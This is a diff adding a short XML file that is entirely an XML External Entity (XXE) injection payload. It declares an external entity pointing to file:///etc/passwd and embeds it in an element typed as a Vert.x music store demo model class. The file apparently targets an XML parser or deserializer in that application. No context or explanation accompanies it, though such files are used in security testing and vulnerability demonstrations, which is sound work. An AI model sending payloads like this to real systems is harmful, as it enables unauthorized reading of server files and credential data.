@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE io.vertx.demo.musicstore.model.Foo [
+<!ELEMENT io.vertx.demo.musicstore.model.Foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<io.vertx.demo.musicstore.model.Foo><test>&xxe;</test></io.vertx.demo.musicstore.model.Foo>
